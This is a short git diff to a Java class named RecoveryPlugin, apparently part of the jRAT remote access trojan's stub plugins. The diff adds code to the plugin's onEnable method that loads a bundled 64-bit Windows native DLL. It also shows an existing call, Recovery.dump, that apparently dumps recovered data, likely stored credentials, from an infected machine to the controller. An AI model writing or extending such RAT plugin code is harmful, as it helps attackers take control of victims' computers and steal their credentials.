@@ -2,9 +2,13 @@ package jrat.plugin.recovery.stub;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
-import java.util.List;
 
 import jrat.api.stub.StubPlugin;
+import libloader.GlobalLibraries;
+import libloader.ResourceLibrary;
+
+import com.redpois0n.oslib.Arch;
+import com.redpois0n.oslib.OperatingSystem;
 
 @SuppressWarnings("unused")
 public class RecoveryPlugin extends StubPlugin {
@@ -31,9 +35,13 @@ public class RecoveryPlugin extends StubPlugin {
 			Recovery.dump(dos);
 		}
 	}
+	
 	@Override
 	public void onEnable() throws Exception {
+		ResourceLibrary w64 = new ResourceLibrary("/natives/windows_64.dll", OperatingSystem.WINDOWS, Arch.x86_64);
 		
+		GlobalLibraries.addLibrary(w64);
+		GlobalLibraries.loadLibraries();
 	}
 	
 	@Override
